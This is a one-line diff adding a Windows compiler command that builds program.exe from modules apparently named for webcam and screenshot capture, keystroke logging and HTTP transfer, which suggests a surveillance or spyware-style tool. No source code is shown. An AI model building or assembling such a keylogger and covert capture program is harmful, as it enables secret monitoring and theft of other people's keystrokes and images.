@@ -1,0 +1,1 @@
+cl /W4 main.c Capture/escapi.c Capture/webcam.c Capture/screenshot.c Capture/capture_utils.c KeyLogger/logger.c KeyLogger/keylogger_utils.c HTTP/http.c HTTP/parse.c /link /out:program.exe
